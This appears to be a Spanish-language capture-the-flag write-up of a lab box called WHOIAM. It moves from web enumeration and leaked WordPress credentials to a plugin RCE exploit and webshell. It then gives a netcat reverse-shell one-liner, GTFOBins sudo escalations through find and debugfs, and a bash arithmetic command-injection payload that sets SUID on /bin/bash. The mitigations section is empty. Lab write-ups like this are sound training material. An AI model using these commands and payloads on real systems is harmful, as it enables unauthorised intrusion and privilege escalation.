# WHOIAM

#### Dificultad: Fácil

___

#### FASE RECONOCIMIENTO:

1. Escaneo:  
Usaremos `nmap -n -v --open -sV -sV -oN escaneo <IP>`.  
Del mismo obtenemos que únicamente el puerto 80 tiene un servicio. por lo tanto se trata de una Web-App y que la versión es Apache 2.4.58 y que el sistema host en un sistema Ubuntu.

Ahora, corremos también `whatweb`: `whatweb <IP>` para Footprinting Web. Vemos que además, tiene JQuery 3.7.1. Podría sernos útil.  


2. Enumeración Web:  

2.1. Empezamos con los Directorios, usando, por ejemplo, `wfuzz -c --hc 404 -t 200 -z file,<diccionario> -R 3 -u "http://<IP>/FUZZ"` encontramos:  
```
- /backups/		
- /wp-includes/
- /wp-admin/			
  - /wp-login.php?redirect_to=http%3A%2F%2F172.18.0.3%2Fwp-admin%2F&reauth=1
- /wp-content/				
- /wp-content/upgrade    	
- /wp-content/plugins    
- /wp-content/themes     
- /wp-content/uploads    	
- /wp-includes/l10n   		I
- /wp-includes/certificate
- /wp-includes/sitemaps  
- /wp-includes/widgets   
- /wp-includes/fonts     
- /wp-includes/customize 
- /wp-includes/blocks    
- /wp-includes/assets    
- /wp-includes/images    
- /wp-includes/css       
- /wp-includes/js    
```

2.2 Ahora proseguimos con los Recursos (PHP-HTML-TXT):  
`wfuzz -c --hc 404 -t 200 -z file,/usr/share/wordlists/dirb/big.txt -z list,"php-html-txt -u "http://<IP>/FUZZ.FUZ2Z"`  

```
- /index.php       
- /license.txt     		
- /readme.html     
- /wp-login.php    		
- /xmlrpc.php  		    	
- /wp-trackback.php
- /wp-config.php
- /wp-admin/media-new.php
```



3. Búsqueda de Vulnerabilidades:



#### FASE EXPLOTACIÓN:
Web:  
De estas enumeración, por el momento nos quedamos con `/backups`. Yendo a este endpoint vemos que podemos descargar un recurso: `databaseback2may.zip`. Lo hacemos y primero revisamos localmente sin extraer para estar seguros. Lo hacemos con `unzip -l <zip>`. Vemoos muestra un único archivito llamado `29DBMay`. Ahora sí, procedemos a extraerlo con `unzip <zip>` le hacemos un `cat 29DBMay` y obtenemos las credenciales `developer:2wmy3KrGDRD%RsA7Ty5n71L^`. Investigando un poco con `hashid 2wmy3KrGDRD%RsA7Ty5n71L^` y la web vemos que no se trata de una hash válido ni base64, entonces probablemente se trata de un texto claro.  

Entonces, procedemos a probar nuestras nuevas credenciales en el endpoint `/wp-login.php` y logramos **Footholding Web**.  

Sistema:  
Navegando por el dashboard encontramos un endpoint interesante por el cual podríamos pobrar subir una WebShell para lograr acceso inicial al sistema. Este recurso es `/wp-admin/media-new.php`. Al intentar subir algún archivo nos damos cuenta que no es posible porque no tenemos los permisos como `developer`.  

Entonces, probamos hacer un poco de Footprinting de la WebApp. Encontramos que la versión de WordPress es 6.8.3, que tiene algunos Plugins instalados como:
* Askimet 5.3.2
* Modern Events Calendar Lite 5.16.2

Además tiene Temas como:  
*  Twenty Twenty-Four 1.1
*  Twenty Twenty-Three 1.4
*  Twenty Twenty-Two 1.7
			
Encontramos otro usuario admin llamado `eric`.  

Usamos la herramienta `searchsploit` buscando exploits para todo lo hallado anteriormente. Después de algún tiempo, encontramos uno directo para RCE para el Plugin Modern Events Calendar Lite 5.16.2 de Wordpress. Lo descargamos con `searchsploit -m <exploit>`.  

Siguiendo las instrucciones del exploit, lo lanzamos, nos da la URI de la webshell (http://<IP_Whoiam>/wp-content/uploads/shell.php), nos dirigimos allí y nos da una [PownyWebShell](https://github.com/flozz/p0wny-shell). Esta se lanza en el navegador de una manera limitada y nos da un FootHolding básico al sistema.  


Entonces, hacemos rápidamente un `whoami` y nos devuelve `www-data`. Dicho esto, nos apuramos a lanzar una Reverse Shell para tener más control localmente. Para ello, preparamos un listener. En este caso, uso [Penelope](https://github.com/brightio/penelope). Corremos `penelope -i <IP_local> -p <puerto_local>` y queda escuchando. 

Primero vemos las herramientas instaladas en el sistema para ver con qué podemos correr la RevShell. Hacemos rápidamente `which python python2 python3 nc` y encontramos a `/usr/bin/nc`. Ahora vamos a https://www.revshells.com/ y probando y probando encontramos que la manera de lanzarla según la config de la víctima es con la versión portable (POSIX) ejecutado `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2>&1|nc <IP_local> <puerto_local> >/tmp/f`.  

Una vez lograda la conexión, tenemos mucha más funcionalidad.  

Lanzamos `whoami` y somos `www-data`.  

#### FASE POST-EXPLOTACIÓN: Elevar Privilegios

Ahora sí, es turno de Enumerar Usuarios. Lo hacemos de la siguientes maneras:  

* cat /etc/passwd
* ls -l /home/

Conseguimos 2 usuarios relevantes:  
1. rafa
2. ruben

Ambos usan /bin/bash.  

Bien, lo segundo que debemos hacer es Buscar Binarios SUID y Privilegios Sudo. El primero lo conseguimos corriendo `find / -type f -perm -4000 2>/dev/null | xargs ls -l`. Esto no nos da ninguno que se aprecie.  
Entonces probamos el siguiente con `sudo -l`. Nos devuelve:  
`(rafa) NOPASSWD: /usr/bin/find`.  
Vamos a [GTFOBins](https://gtfobins.github.io/) y buscamos `find` filtrando por `sudo`. Encontramos que correiendo `sudo -u rafa find . -exec /bin/bash \; -quit` hacemos **Movimiento Lateral** al usuario `rafa`. Lo hacemos y ya somos `rafa`.  

Ahora desde este usuario volvemos a correr `sudo -l` y vemos `(ruben) NOPASSWD: /usr/sbin/debugfs`. Volviendo a hacer **Explotación Sudo** podemos converirnos ahora en ruber. Vamos a la GTFOBins nuevamentne y buscamos `debugfs` filtrando por `sudo`.  

Terminamos lanzando `sudo -u ruben /usr/sbin/debugfs`, nos sale un prompt, le damos a `!/bin/bash` y ya somos `ruben`.  

Ahora, nuevamente ejecutamos vemos los Privilegios Sudo con `sudo -l` y nos devuelve `(ALL) NOPASSWD: /bin/bash /opt/penguin.sh`. Significa que podemos lanzar `sudo` sin contraseña corriendo el script con /bin/bash.  

Entonces, siguiente paso, es saber qué hace el script. Lo averiguamos con `cat`. Vemos este código:  

```
#!/bin/bash
read -rp "Enter guess: " num

if [[ $num -eq 42 ]]
then
  echo "Correct"
else
  echo "Wrong"
fi
```

Significa que el script espera una entrada de texto del usuario en crudo, compara si es igual a al entero 42; si lo es devuelve "Correct", si no, "Wrong".  Entonces, en este punto, hay que estar pensando en que la solución puede estar en una **Inyección de Comandos por Expansión de Shell**. Significa que puedo pasarle un comando del sistema que pueda permitirme **Elevar Privilegios**.  

Por lo tanto, corro el script con `sudo -u root /bin/bash /opt/penguin.sh` me lanza el prompt y le mando `a[$(chmod u+s /bin/bash)]+42, por ejemplo.  

> El `Bloque IF` intentar parsear la entrada a entero para poder compararla con 42. En ese proceso, al querer acceder al valor del índice 0 del array, ejecuta la **Expansión de Comandos $(...)**, por lo que la orden maliciosa termina, efectivamente, corriendo con privilegios de root. Esto, entonces, concluye dando el **Permiso SUID** a */bin/bash*, lo cual es muy peligroso.  

>  Como el Array ingresado se termina parseando a 0 en el bloque condicional de `if`, puesto que el primer dígito es un caracter, el +42 tiene la función de no dar errores y el script se ejecute normalmente (no hace falta, es un adorno).

Ahora hacemos `whoami` y somos `root`. Eso es todo.



#### MITIGACIONES:  
